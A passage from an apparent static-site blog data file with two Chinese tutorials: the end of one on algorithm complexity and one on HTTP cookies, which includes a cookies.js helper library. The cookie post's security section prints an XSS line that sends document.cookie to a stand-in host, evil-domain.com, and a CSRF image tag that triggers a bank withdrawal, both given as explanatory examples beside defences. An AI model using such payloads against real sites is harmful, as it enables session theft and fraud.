</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    sum = sum + <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上代码总的时间复杂度就是 O(n)。</p>\n<ol start=\"2\">\n<li>加法法则：总复杂度等于量级最大的那段代码的复杂度</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> p = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; p &lt; <span class=\"number\">100</span>; ++p) &#123;</span><br><span class=\"line\">    sum_1 = sum_1 + p;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> q = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; q &lt; n; ++q) &#123;</span><br><span class=\"line\">    sum_2 = sum_2 + q;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> j = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    j = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; j &lt;= n; ++j) &#123;</span><br><span class=\"line\">      sum_3 = sum_3 + i * j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum_1 + sum_2 + sum_3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>综合这三段代码的时间复杂度，我们取其中最大的量级。所以，整段代码的时间复杂度就为 O(n<sup>2</sup>)。也就是说：<strong>总的时间复杂度<strong><strong>就</strong></strong>等于量级最大的那段代码的时间复杂度</strong>。那我们将这个规律抽象成公式就是：</p>\n\n<ol start=\"3\">\n<li>乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt; n; ++i) &#123;</span><br><span class=\"line\">    ret = ret + f(i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt; n; ++i) &#123;</span><br><span class=\"line\">    sum = sum + i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们单独看 cal() 函数。假设 f() 只是一个普通的操作，那第 4～6 行的时间复杂度就是，T1(n) = O(n)。但 f() 函数本身不是一个简单的操作，它的时间复杂度是 T2(n) = O(n)，所以，整个 cal() 函数的时间复杂度就是，T(n) = T1(n) <em> T2(n) = O(n</em>n) = O(n<sup>2</sup>)。</p>\n\n<h2 id=\"几种常见时间复杂度实例分析\"><a href=\"#几种常见时间复杂度实例分析\" class=\"headerlink\" title=\"几种常见时间复杂度实例分析\"></a>几种常见时间复杂度实例分析</h2><p><img src=\"/数据结构与算法@复杂度分析/normal.jpg\" alt=\"\"></p>\n<ol>\n<li>O(1)<br>O(1) 只是常量级时间复杂度的一种表示方法，并不是指只执行了一行代码。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> j = <span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> sum = i + j;</span><br></pre></td></tr></table></figure>\n<p>总结一下，只要代码的执行时间不随 n 的增大而增长，这样代码的时间复杂度我们都记作 O(1)。或者说，<strong>一般<strong><strong>情况下</strong></strong>，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)</strong>。</p>\n\n<ol start=\"2\">\n<li>O(logn)、O(nlogn)<br>对数阶时间复杂度非常常见，同时也是最难分析的一种时间复杂度。如下代码：</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (i &lt;= n) &#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一个个列出来，就是这个样子：<br><img src=\"/数据结构与算法@复杂度分析/log.jpg\" alt=\"\"></p>\n<p>所以，我们只要知道 x 值是多少，就知道这行代码执行的次数了。通过 2<sup>x</sup>=n 求解 x 这个问题我们想高中应该就学过了，我就不多说了。x=log<sub>2</sub>n，所以，这段代码的时间复杂度就是 O(log<sub>2</sub>n)。</p>\n\n<p>现在稍微改下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (i &lt;= n) &#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码的时间复杂度为 O(log<sub>3</sub>n)。</p>\n<p>实际上，不管是以 2 为底、以 3 为底，还是以 10 为底，我们可以把所有对数阶的时间复杂度都记为 O(logn)。为什么呢？</p>\n\n<p>我们知道，对数之间是可以互相转换的，log<sub>3</sub>n 就等于 log<sub>3</sub>2 <em> log<sub>2</sub>n，所以 O(log<sub>3</sub>n) = O(C </em>  log<sub>2</sub>n)，其中 C=log<sub>3</sub>2 是一个常量。基于我们前面的一个理论：<strong>在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))</strong>。所以，O(log<sub>2</sub>n) 就等于 O(log<sub>3</sub>n)。因此，在对数阶时间复杂度的表示方法里，我们忽略对数的“底”，统一表示为 O(logn)。</p>\n\n<p>如果你理解了我前面讲的 O(logn)，那 O(nlogn) 就很容易理解了。还记得我们刚讲的乘法法则吗？如果一段代码的时间复杂度是 O(logn)，我们循环执行 n 遍，时间复杂度就是 O(nlogn) 了。而且，O(nlogn) 也是一种非常常见的算法时间复杂度。比如，归并排序、快速排序的时间复杂度都是 O(nlogn)。</p>\n\n<ol start=\"3\">\n<li>O(m+n)、O(m*n)</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">m, n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt; m; ++i) &#123;</span><br><span class=\"line\">    sum_1 = sum_1 + i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> j = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; j &lt; n; ++j) &#123;</span><br><span class=\"line\">    sum_2 = sum_2 + j;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum_1 + sum_2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中可以看出，m 和 n 是表示两个数据规模。我们无法事先评估 m 和 n 谁的量级大，所以我们在表示复杂度的时候，就不能简单地利用加法法则，省略掉其中一个。所以，上面代码的时间复杂度就是 O(m+n)。</p>\n\n<p>针对这种情况，原来的加法法则就不正确了，我们需要将加法规则改为：T1(m) + T2(n) = O(f(m) + g(n))。但是乘法法则继续有效：T1(m)<em>T2(n) = O(f(m) </em> f(n))。</p>\n\n<h2 id=\"空间复杂度分析\"><a href=\"#空间复杂度分析\" class=\"headerlink\" title=\"空间复杂度分析\"></a>空间复杂度分析</h2><p>前面我讲过，时间复杂度的全称是<strong>渐进时间复杂度</strong>，<strong>表示算法的执行时间与数据规模之间的增长关系</strong>。类比一下，空间复杂度全称就是<strong>渐进空间复杂度</strong>（asymptotic space complexity），<strong>表示算法的存储空间与数据规模之间的增长关系</strong>。</p>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> print(int n) &#123;</span><br><span class=\"line\">  int i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  int[] a = <span class=\"keyword\">new</span> int[n];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i; i &lt;n; ++i) &#123;</span><br><span class=\"line\">    a[i] = i * i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = n<span class=\"number\">-1</span>; i &gt;= <span class=\"number\">0</span>; --i) &#123;</span><br><span class=\"line\">    print out a[i]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>跟时间复杂度分析一样，我们可以看到，第 2 行代码中，我们申请了一个空间存储变量 i，但是它是常量阶的，跟数据规模 n 没有关系，所以我们可以忽略。第 3 行申请了一个大小为 n 的 int 类型数组，除此之外，剩下的代码都没有占用更多的空间，所以整段代码的空间复杂度就是 O(n)。</p>\n\n<p>我们常见的空间复杂度就是 O(1)、O(n)、O(n<sup>2</sup> )，像 O(logn)、O(nlogn) 这样的对数阶复杂度平时都用不到。而且，空间复杂度分析比时间复杂度分析要简单很多。所以，对于空间复杂度，掌握刚我说的这些内容已经足够了。</p>\n\n<h2 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h2><p>复杂度也叫渐进复杂度，包括时间复杂度和空间复杂度，用来分析算法执行效率与数据规模之间的增长关系，可以粗略地表示，越高阶复杂度的算法，执行效率越低。常见的复杂度并不多，从低阶到高阶有：O(1)、O(logn)、O(n)、O(nlogn)、O(n<sup>2</sup> )。<strong>复杂度分析并不难，关键在于多练。</strong></p>\n\n<p>另外还有四个时间复杂度知识可以进一步学习下：最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——数据结构与算法之美</p>"},{"title":"Cookie一箩筐","date":"2019-06-21T05:22:34.000Z","updated":"2019-06-21T05:22:34.000Z","_content":"\n# 概述\n\nHTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。\n\n<!-- more -->\n\nCookie 主要用于以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\nCookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。\n\n# 详述\n\n## 创建 Cookie\n\n当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。\n\n### Set-Cookie 响应头部和 Cookie 请求头部\n\n服务器使用`Set-Cookie`响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：\n\n```\nSet-Cookie: <cookie名>=<cookie值>\n```\n\n服务器通过该头部告知客户端**保存**Cookie 信息。\n\n对于服务端程序中设置 Set-Cookie 响应头信息，不同语言有各自的语法，Node.JS 示例如下：\n\n```js\nresponse.setHeader(\"Set-Cookie\", [\"type=ninja\", \"language=javascript\"]);\n```\n\n响应头示例：\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\n下一次的请求头示例：\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n## 几个概念\n\n会话期 Cookie：浏览器关闭自动删除 cookie。\n\n持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）。\n\nCookie 的 Secure 标记：Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。\n\nCookie 的 HttpOnly 标记：只能发送给服务端而不能被 JavaScript 脚本调用。\n\nCookie 的作用域：Domain 和 Path 标识定义了 Cookie 的作用域，即 Cookie 应该发送给哪些 URL。\n\nJavaScript 调用：通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。\n\n## 安全\n\n> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。\n\n### 会话劫持和 XSS\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n### 跨站请求伪造（CSRF）\n\n比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：\n\n```html\n<img\n  src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\"\n/>\n```\n\n当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：\n\n- 对用户输入进行过滤来阻止 XSS；\n- 任何敏感操作都需要确认；\n- 用于敏感信息的 Cookie 只能拥有较短的生命周期；\n- 更多方法可以查看[OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>)。\n\n## 封装一个 cookie 使用库\n\n写入一个 cookie：`docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])`\n\n获取一个 cookie：`docCookies.getItem(name)`\n\n移除一个 cookie：`docCookies.removeItem(name[, path[, domain]])`\n\n检查一个 cookie（是否存在）：`docCookies.hasItem(name)`\n\n获取所有 cookie 列表：`docCookies.keys()`\n\n```js\n/*\\\n|*|\n|*|  :: cookies.js ::\n|*|\n|*|  A complete cookies reader/writer framework with full unicode support.\n|*|\n|*|  Revision #1 - September 4, 2014\n|*|\n|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie\n|*|  https://developer.mozilla.org/User:fusionchess\n|*|  https://github.com/madmurphy/cookies.js\n|*|\n|*|  This framework is released under the GNU Public License, version 3 or later.\n|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html\n|*|\n|*|  Syntaxes:\n|*|\n|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])\n|*|  * docCookies.getItem(name)\n|*|  * docCookies.removeItem(name[, path[, domain]])\n|*|  * docCookies.hasItem(name)\n|*|  * docCookies.keys()\n|*|\n\\*/\n\nvar docCookies = {\n  getItem: function(sKey) {\n    if (!sKey) {\n      return null;\n    }\n    return (\n      decodeURIComponent(\n        document.cookie.replace(\n          new RegExp(\n            \"(?:(?:^|.*;)\\\\s*\" +\n              encodeURIComponent(sKey).replace(/[\\-\\.\\+\\*]/g, \"\\\\$&\") +\n              \"\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$\"\n          ),\n          \"$1\"\n        )\n      ) || null\n    );\n  },\n  setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {\n    if (!sKey || /^(?:expires|max\\-age|path|domain|secure)$/i.test(sKey)) {\n      return false;\n    }\n    var sExpires = \"\";\n    if (vEnd) {\n      switch (vEnd.constructor) {\n        case Number:\n          sExpires =\n            vEnd === Infinity\n              ? \"; expires=Fri, 31 Dec 9999 23:59:59 GMT\"\n              : \"; max-age=\" + vEnd;\n          break;\n        case String:\n          sExpires = \"; expires=\" + vEnd;\n          break;\n        case Date:\n          sExpires = \"; expires=\" + vEnd.toUTCString();\n          break;\n      }\n    }\n    document.cookie =\n      encodeURIComponent(sKey) +\n      \"=\" +\n      encodeURIComponent(sValue) +\n      sExpires +\n      (sDomain ? \"; domain=\" + sDomain : \"\") +\n      (sPath ? \"; path=\" + sPath : \"\") +\n      (bSecure ? \"; secure\" : \"\");\n    return true;\n  },\n  removeItem: function(sKey, sPath, sDomain) {\n    if (!this.hasItem(sKey)) {\n      return false;\n    }\n    document.cookie =\n      encodeURIComponent(sKey) +\n      \"=; expires=Thu, 01 Jan 1970 00:00:00 GMT\" +\n      (sDomain ? \"; domain=\" + sDomain : \"\") +\n      (sPath ? \"; path=\" + sPath : \"\");\n    return true;\n  },\n  hasItem: function(sKey) {\n    if (!sKey) {\n      return false;\n    }\n    return new RegExp(\n      \"(?:^|;\\\\s*)\" +\n        encodeURIComponent(sKey).replace(/[\\-\\.\\+\\*]/g, \"\\\\$&\") +\n        \"\\\\s*\\\\=\"\n    ).test(document.cookie);\n  },\n  keys: function() {\n    var aKeys = document.cookie\n      .replace(/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g, \"\")\n      .split(/\\s*(?:\\=[^;]*)?;\\s*/);\n    for (var nLen = aKeys.length, nIdx = 0; nIdx < nLen; nIdx++) {\n      aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]);\n    }\n    return aKeys;\n  }\n};\n```\n\n## 第三方库\n\n[jquery.cookie.js](https://github.com/carhartl/jquery-cookie#readme)官方已停止维护，并推荐使用全新的[js-cookie](https://github.com/js-cookie/js-cookie)。\n\n### js-cookie\n\n```js\n// 创建一个cookie，在整个网站有效\nCookies.set(\"name\", \"value\");\n// 创建一个cookie，有效期为7天，整个网站有效\nCookies.set(\"name\", \"value\", { expires: 7 });\n// 创建一个cookie，有效期7天，当前路径有效\nCookies.set(\"name\", \"value\", { expires: 7, path: \"\" });\n\n// 读取\nCookies.get(\"name\"); // => 'value'\nCookies.get(\"nothing\"); // => undefined\n// 读取所有\nCookies.get(); // => { name: 'value' }\n// 通过设置domain或者path来读取特定cookie是不起效果的\nCookies.get(\"foo\", { domain: \"sub.example.com\" }); // `domain` won't have any effect...!\n// 删除\nCookies.remove(\"name\");\n// 对于设置了domain或者path的cookie，删除时也必须配置相应的属性参数\nCookies.set(\"name\", \"value\", { path: \"\" });\nCookies.remove(\"name\"); // fail!\nCookies.remove(\"name\", { path: \"\" }); // removed!\n\nCookies.remove(\"name\", { path: \"\", domain: \".yourdomain.com\" });\n```\n\n### jquery.cookie.js\n\n使用逻辑与 `js-cookie` 一致\n\n```js\n// Create session cookie:\n$.cookie(\"name\", \"value\");\n\n// Create expiring cookie, 7 days from then:\n$.cookie(\"name\", \"value\", { expires: 7 });\n\n// Create expiring cookie, valid across entire site:\n$.cookie(\"name\", \"value\", { expires: 7, path: \"/\" });\n\n// Read cookie:\n$.cookie(\"name\"); // => \"value\"\n$.cookie(\"nothing\"); // => undefined\n\n// Read all available cookies:\n$.cookie(); // => { \"name\": \"value\" }\n\n// Delete cookie:\n\n// Returns true when cookie was successfully deleted, otherwise false\n$.removeCookie(\"name\"); // => true\n$.removeCookie(\"nothing\"); // => false\n\n// Need to use the same attributes (path, domain) as what the cookie was written with\n$.cookie(\"name\", \"value\", { path: \"/\" });\n// This won't work!\n$.removeCookie(\"name\"); // => false\n// This will work!\n$.removeCookie(\"name\", { path: \"/\" }); // => true\n\n// Note: when deleting a cookie, you must pass the exact same path, domain and secure options that were used to set the cookie, unless you're relying on the default options that is.\n```\n\n## 实践场景\n\n系统升级后，对于历史 B 类买家，第一次登陆系统后在对应的承载页给出弹框提示。\n实现思路：登陆时后端根据账户数据判断出是否为符合条件的用户，符合则在响应头中设置 cookie 值，前端页面加载时获取对应的 cookie 值，判断是否需要显示弹框。弹框确认关闭后清除 cookie。\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework\n","source":"_posts/2019/06/cookie.md","raw":"---\ntitle: Cookie一箩筐\npermalink: cookie\ntags:\n  - cookie\ncategories:\n  - 基础\ndate: 2019-06-21 13:22:34\nupdated: 2019-06-21 13:22:34\n---\n\n# 概述\n\nHTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。\n\n<!-- more -->\n\nCookie 主要用于以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\nCookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。\n\n# 详述\n\n## 创建 Cookie\n\n当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。\n\n### Set-Cookie 响应头部和 Cookie 请求头部\n\n服务器使用`Set-Cookie`响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：\n\n```\nSet-Cookie: <cookie名>=<cookie值>\n```\n\n服务器通过该头部告知客户端**保存**Cookie 信息。\n\n对于服务端程序中设置 Set-Cookie 响应头信息，不同语言有各自的语法，Node.JS 示例如下：\n\n```js\nresponse.setHeader(\"Set-Cookie\", [\"type=ninja\", \"language=javascript\"]);\n```\n\n响应头示例：\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\n下一次的请求头示例：\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n## 几个概念\n\n会话期 Cookie：浏览器关闭自动删除 cookie。\n\n持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）。\n\nCookie 的 Secure 标记：Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。\n\nCookie 的 HttpOnly 标记：只能发送给服务端而不能被 JavaScript 脚本调用。\n\nCookie 的作用域：Domain 和 Path 标识定义了 Cookie 的作用域，即 Cookie 应该发送给哪些 URL。\n\nJavaScript 调用：通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。\n\n## 安全\n\n> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。\n\n### 会话劫持和 XSS\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n### 跨站请求伪造（CSRF）\n\n比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：\n\n```html\n<img\n  src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\"\n/>\n```\n\n当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：\n\n- 对用户输入进行过滤来阻止 XSS；\n- 任何敏感操作都需要确认；\n- 用于敏感信息的 Cookie 只能拥有较短的生命周期；\n- 更多方法可以查看[OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>)。\n\n## 封装一个 cookie 使用库\n\n写入一个 cookie：`docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])`\n\n获取一个 cookie：`docCookies.getItem(name)`\n\n移除一个 cookie：`docCookies.removeItem(name[, path[, domain]])`\n\n检查一个 cookie（是否存在）：`docCookies.hasItem(name)`\n\n获取所有 cookie 列表：`docCookies.keys()`\n\n```js\n/*\\\n|*|\n|*|  :: cookies.js ::\n|*|\n|*|  A complete cookies reader/writer framework with full unicode support.\n|*|\n|*|  Revision #1 - September 4, 2014\n|*|\n|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie\n|*|  https://developer.mozilla.org/User:fusionchess\n|*|  https://github.com/madmurphy/cookies.js\n|*|\n|*|  This framework is released under the GNU Public License, version 3 or later.\n|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html\n|*|\n|*|  Syntaxes:\n|*|\n|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])\n|*|  * docCookies.getItem(name)\n|*|  * docCookies.removeItem(name[, path[, domain]])\n|*|  * docCookies.hasItem(name)\n|*|  * 